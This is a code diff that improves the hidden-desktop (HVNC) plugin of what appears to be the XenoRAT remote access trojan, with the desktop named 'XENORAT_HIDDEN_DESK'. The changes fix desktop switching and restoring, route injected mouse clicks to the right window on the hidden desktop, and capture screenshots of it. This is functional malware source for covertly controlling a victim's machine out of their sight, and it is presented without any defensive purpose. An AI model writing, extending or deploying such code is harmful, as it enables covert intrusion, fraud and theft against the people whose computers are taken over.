@@ -61,6 +61,9 @@ namespace Plugin
         [DllImport("user32.dll", SetLastError = true)]
         static extern bool SetThreadDesktop(IntPtr hDesktop);
 
+        [DllImport("user32.dll")]
+        private static extern IntPtr GetThreadDesktop(int dwThreadId);
+
         [DllImport("user32.dll", SetLastError = false)]
         static extern IntPtr GetDesktopWindow();
 
@@ -124,6 +127,9 @@ namespace Plugin
 
         [DllImport("kernel32.dll", SetLastError = true)]
         private static extern bool CloseHandle(IntPtr hObject);
+
+        [DllImport("kernel32.dll")]
+        private static extern int GetCurrentThreadId();
 
         // FIXED: Use PostMessage instead of SendInput to avoid desktop switching
         [DllImport("user32.dll")]
@@ -216,9 +222,9 @@ namespace Plugin
         private static IntPtr DesktopHandle = IntPtr.Zero;
         private static readonly string HiddenDesktopName = "XENORAT_HIDDEN_DESK";
 
-        public static void InitializeDesktop()
+        public static bool InitializeDesktop()
         {
-            if (DesktopHandle != IntPtr.Zero) return;
+            if (DesktopHandle != IntPtr.Zero) return true;
 
             // Attempt to open the desktop first
             IntPtr desk = OpenDesktop(HiddenDesktopName, 0, true, (uint)DESKTOP_ACCESS.GENERIC_ALL);
@@ -233,6 +239,7 @@ namespace Plugin
                 {
                     // Don't show message box in hidden operation
                     Debug.WriteLine("Failed to create hidden desktop. Error code: " + Marshal.GetLastWin32Error());
+                    return false;
                 }
             }
 
@@ -251,6 +258,8 @@ namespace Plugin
                     Debug.WriteLine("Failed to start test process on hidden desktop: " + ex.Message);
                 }
             }
+
+            return DesktopHandle != IntPtr.Zero;
         }
 
         private static void CreateProcessOnDesktop(string desktopName, string commandLine)
@@ -283,25 +292,59 @@ namespace Plugin
             }
         }
 
+        private static bool TrySwitchToHiddenDesktop(out IntPtr originalDesktop)
+        {
+            originalDesktop = IntPtr.Zero;
+
+            if (!InitializeDesktop())
+                return false;
+
+            originalDesktop = GetThreadDesktop(GetCurrentThreadId());
+
+            if (!SetThreadDesktop(DesktopHandle))
+            {
+                Debug.WriteLine("HVNC: failed to switch to hidden desktop. Error code: " + Marshal.GetLastWin32Error());
+                return false;
+            }
+
+            return true;
+        }
+
+        private static void RestoreDesktop(IntPtr originalDesktop)
+        {
+            if (originalDesktop != IntPtr.Zero && originalDesktop != DesktopHandle)
+            {
+                SetThreadDesktop(originalDesktop);
+            }
+        }
+
         // FIXED: Use window messaging instead of desktop switching for input
         public static void SendMouseClick(int x, int y, uint buttonFlags)
         {
-            if (DesktopHandle == IntPtr.Zero) return;
+            if (DesktopHandle == IntPtr.Zero && !InitializeDesktop()) return;
 
-            // We need to find the target window on the hidden desktop
-            // For now, we'll send to the foreground window on the hidden desktop
-            // In a real implementation, you'd need to enumerate windows on the hidden desktop
-
-            // Switch thread to hidden desktop temporarily
-            bool threadSwitched = SetThreadDesktop(DesktopHandle);
+            if (!TrySwitchToHiddenDesktop(out var originalDesktop))
+                return;
 
             try
             {
-                // Get the desktop window of the hidden desktop
                 IntPtr hiddenDesktopWnd = GetDesktopWindow();
+                POINT point = new POINT(x, y);
+                IntPtr targetWindow = WindowFromPoint(point);
+
+                if (targetWindow == IntPtr.Zero)
+                {
+                    targetWindow = hiddenDesktopWnd;
+                }
 
                 // Convert coordinates to lParam for PostMessage
-                IntPtr lParam = (IntPtr)((y << 16) | x);
+                POINT clientPoint = point;
+                if (targetWindow != IntPtr.Zero)
+                {
+                    ScreenToClient(targetWindow, ref clientPoint);
+                }
+
+                IntPtr lParam = (IntPtr)((clientPoint.Y << 16) | (clientPoint.X & 0xFFFF));
 
                 uint message = 0;
                 switch (buttonFlags)
@@ -315,27 +358,21 @@ namespace Plugin
 
                 if (message != 0)
                 {
-                    // Send to the desktop window which will route to the appropriate child window
-                    PostMessage(hiddenDesktopWnd, message, IntPtr.Zero, lParam);
+                    PostMessage(targetWindow, message, IntPtr.Zero, lParam);
                 }
             }
             finally
             {
-                // Switch back to original desktop if we switched
-                if (threadSwitched)
-                {
-                    // Note: In practice, you might want to save the original desktop and switch back to it
-                    // This is simplified for the example
-                }
+                RestoreDesktop(originalDesktop);
             }
         }
 
         public static void SendKeyboardInput(byte keyCode, bool keyDown)
         {
-            if (DesktopHandle == IntPtr.Zero) return;
+            if (DesktopHandle == IntPtr.Zero && !InitializeDesktop()) return;
 
-            // Switch thread to hidden desktop temporarily
-            bool threadSwitched = SetThreadDesktop(DesktopHandle);
+            if (!TrySwitchToHiddenDesktop(out var originalDesktop))
+                return;
 
             try
             {
@@ -352,11 +389,7 @@ namespace Plugin
             }
             finally
             {
-                // Switch back to original desktop if we switched
-                if (threadSwitched)
-                {
-                    // Note: In practice, you might want to save the original desktop and switch back to it
-                }
+                RestoreDesktop(originalDesktop);
             }
         }
 
@@ -436,37 +469,32 @@ namespace Plugin
 
         public static Bitmap Screenshot()
         {
-            if (DesktopHandle == IntPtr.Zero)
-            {
-                InitializeDesktop();
-                if (DesktopHandle == IntPtr.Zero)
-                {
-                    return new Bitmap(1, 1);
-                }
-            }
-
-            // Switch the current thread to the hidden desktop
-            if (!SetThreadDesktop(DesktopHandle))
-            {
+            if (!TrySwitchToHiddenDesktop(out var originalDesktop))
                 return new Bitmap(1, 1);
+
+            try
+            {
+                IntPtr DC = GetDC(IntPtr.Zero);
+
+                RECT DesktopSize;
+                GetWindowRect(GetDesktopWindow(), out DesktopSize);
+
+                float scalingFactor = GetScalingFactor();
+
+                Bitmap Screen = new Bitmap((int)(DesktopSize.Right * scalingFactor), (int)(DesktopSize.Bottom * scalingFactor));
+                Graphics ModifiableScreen = Graphics.FromImage(Screen);
+
+                DrawTopDown(IntPtr.Zero, ModifiableScreen, DC);
+
+                ModifiableScreen.Dispose();
+                ReleaseDC(IntPtr.Zero, DC);
+
+                return Screen;
             }
-
-            IntPtr DC = GetDC(IntPtr.Zero);
-
-            RECT DesktopSize;
-            GetWindowRect(GetDesktopWindow(), out DesktopSize);
-
-            float scalingFactor = GetScalingFactor();
-
-            Bitmap Screen = new Bitmap((int)(DesktopSize.Right * scalingFactor), (int)(DesktopSize.Bottom * scalingFactor));
-            Graphics ModifiableScreen = Graphics.FromImage(Screen);
-
-            DrawTopDown(IntPtr.Zero, ModifiableScreen, DC);
-
-            ModifiableScreen.Dispose();
-            ReleaseDC(IntPtr.Zero, DC);
-
-            return Screen;
+            finally
+            {
+                RestoreDesktop(originalDesktop);
+            }
         }
     }
 }
